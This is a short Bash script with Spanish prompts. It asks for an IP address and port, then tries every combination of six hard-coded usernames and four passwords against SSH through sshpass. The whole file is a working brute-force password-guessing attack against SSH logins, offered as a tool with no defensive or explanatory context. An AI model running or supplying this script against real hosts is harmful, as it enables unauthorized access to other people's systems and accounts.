#!/bin/bash
echo "Dime la ip: "
read ip
echo "Dime el puerto: "
read port
listaNombres=("alejandro" "admin" "jorge" "user" "javier" "pc")
listaPass=("alejandro3" "pass" "admin1234" "fesac456")
numNombres=${#listaNombres[@]}
numPass=${#listaPass[@]}
for ((i=0; i<$numNombres; i++ ))
do
        for((j=0; j<$numPass; j++ ))
        do
        sshpass -p "${listaPass[$j]}" ssh -p "$port" "${listaNombres[$i]}@$ip"
        done
done
